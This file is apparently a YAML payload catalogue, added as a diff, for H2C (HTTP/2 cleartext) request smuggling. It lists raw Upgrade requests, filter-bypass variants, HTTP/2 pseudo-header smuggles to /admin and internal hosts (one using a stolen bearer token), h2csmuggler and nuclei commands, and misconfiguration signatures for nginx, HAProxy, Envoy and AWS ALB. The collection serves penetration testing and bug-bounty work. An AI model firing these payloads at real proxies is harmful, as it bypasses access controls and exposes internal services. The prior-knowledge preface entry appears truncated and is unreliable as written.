@@ -1,0 +1,236 @@
+id: h2c_smuggling
+name: H2C (HTTP/2 Cleartext) Smuggling
+version: 1.0.0
+category: smuggling
+description: |
+  H2C smuggling abuses reverse proxies that blindly forward the HTTP/1.1 Upgrade
+  header to backends that speak h2c. The attacker upgrades to HTTP/2 past the
+  proxy, then issues arbitrary frames bypassing path/auth filters.
+mitre:
+  - T1190
+  - T1556
+owasp_top10:
+  - A05:2021
+references:
+  - https://bishopfox.com/blog/h2c-smuggling-request
+  - https://portswigger.net/research/practical-http-2-smuggling
+  - https://github.com/BishopFox/h2csmuggler
+related_tools:
+  - h2csmuggler
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: classic_upgrade
+    name: Classic H2C upgrade
+    subcategory: upgrade
+    encoding: raw
+    tech_targets: [nginx, haproxy, apache, envoy]
+    severity_when_works: high
+    payload: |
+      GET / HTTP/1.1
+      Host: target.example.net
+      Connection: Upgrade, HTTP2-Settings
+      Upgrade: h2c
+      HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+
+    notes: If proxy forwards Upgrade, backend speaks h2c after this
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: upgrade_lowercase
+    name: Lowercased upgrade tokens
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [nginx, haproxy]
+    severity_when_works: high
+    payload: |
+      GET / HTTP/1.1
+      Host: target.example.net
+      connection: upgrade, http2-settings
+      upgrade: h2c
+      http2-settings: AAMAAABkAARAAAAAAAIAAAAA
+
+    notes: Bypasses case-sensitive blocklists
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: upgrade_with_extra_token
+    name: Extra Connection token confusion
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [haproxy]
+    severity_when_works: high
+    payload: |
+      GET / HTTP/1.1
+      Host: target.example.net
+      Connection: Upgrade, keep-alive, HTTP2-Settings
+      Upgrade: h2c
+      HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+
+    notes: Some proxies look only for "Upgrade" exactly
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: smuggle_admin_path
+    name: Smuggle to admin path
+    subcategory: smuggle_request
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      After upgrade, send HTTP/2 HEADERS frame with :path=/admin (bypassing front-end ACL on /admin).
+    notes: Use h2csmuggler script
+    source: https://github.com/BishopFox/h2csmuggler
+  - id: smuggle_internal_host
+    name: Smuggle to internal Host
+    subcategory: smuggle_request
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      :authority: internal.example.net
+      :path: /
+      :method: GET
+    notes: Pivot to internal vhosts behind same backend
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: smuggle_no_te
+    name: Smuggle with Transfer-Encoding strip
+    subcategory: smuggle_request
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      After upgrade, send POST /pwn with :authority=internal-svc and empty body.
+    notes: null
+    source: common knowledge
+  - id: detection_settings_ack
+    name: Detection via SETTINGS ACK
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Observe 101 Switching Protocols followed by binary SETTINGS frame (0x4) from backend.
+    notes: Indicates h2c upgrade was accepted
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: prior_knowledge_preface
+    name: HTTP/2 prior-knowledge preface
+    subcategory: upgrade
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      PRI * HTTP/2.0
+
+      SM
+
+    notes: Try over plain TCP if proxy forwards arbitrary first bytes
+    source: https://datatracker.ietf.org/doc/html/rfc7540#section-3.5
+  - id: nginx_proxy_pass_h2c
+    name: nginx proxy_pass to h2c
+    subcategory: detection
+    encoding: raw
+    tech_targets: [nginx]
+    severity_when_works: high
+    payload: |
+      proxy_pass http://backend; (without `proxy_http_version 1.1;` and `proxy_set_header Upgrade ...;` -> often vulnerable)
+    notes: Misconfig signature
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: haproxy_default_vuln
+    name: HAProxy default h2c forwarding
+    subcategory: detection
+    encoding: raw
+    tech_targets: [haproxy]
+    severity_when_works: high
+    payload: |
+      HAProxy <2.2 with `option http-server-close` and h2c-capable backend
+    notes: null
+    source: https://bishopfox.com/blog/h2c-smuggling-request
+  - id: envoy_upgrade_config
+    name: Envoy upgrade_configs misuse
+    subcategory: detection
+    encoding: raw
+    tech_targets: [envoy]
+    severity_when_works: high
+    payload: |
+      Envoy listener configured to upgrade h2c without auth-aware filter
+    notes: null
+    source: common knowledge
+  - id: aws_alb_chain
+    name: ALB -> internal h2c smuggling
+    subcategory: detection
+    encoding: raw
+    tech_targets: [aws]
+    severity_when_works: high
+    payload: |
+      Observe ALB target group with HTTP listener and internal h2c-capable instance
+    notes: Combine with VPC reachability
+    source: common knowledge
+  - id: upgrade_post_body
+    name: Upgrade with POST body smuggle
+    subcategory: smuggle_request
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      POST /upgrade HTTP/1.1
+      Host: target.example.net
+      Connection: Upgrade, HTTP2-Settings
+      Upgrade: h2c
+      HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+      Content-Length: 0
+
+    notes: Some proxies forward POST upgrades while blocking GET
+    source: common knowledge
+  - id: smuggle_get_admin_via_h2c
+    name: GET /admin after upgrade (h2csmuggler)
+    subcategory: smuggle_request
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      h2csmuggler -x https://target.example.net -p GET http://target.example.net/admin
+    notes: Tool invocation
+    source: https://github.com/BishopFox/h2csmuggler
+  - id: te_chunked_upgrade
+    name: "TE: chunked + Upgrade"
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      GET / HTTP/1.1
+      Host: target.example.net
+      Connection: Upgrade, HTTP2-Settings, TE
+      TE: chunked
+      Upgrade: h2c
+      HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+
+    notes: Confuses proxy connection management
+    source: common knowledge
+  - id: blind_smuggle_oob
+    name: Blind smuggle to OOB
+    subcategory: oob
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Smuggle GET / with :authority=OOB.example.net to confirm backend issued egress request
+    notes: Confirm via Interactsh
+    source: common knowledge
+  - id: smuggle_jwt_header
+    name: Smuggle with stolen auth header
+    subcategory: smuggle_request
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      :method: GET, :path: /api/admin, authorization: Bearer <stolen-jwt>
+    notes: Bypass front-end auth that strips Authorization on /admin
+    source: common knowledge
+  - id: nuclei_h2c_template
+    name: Nuclei h2c-smuggling template
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      nuclei -t http/misconfiguration/http-smuggling.yaml -u https://target.example.net
+    notes: Tool invocation
+    source: https://github.com/projectdiscovery/nuclei-templates
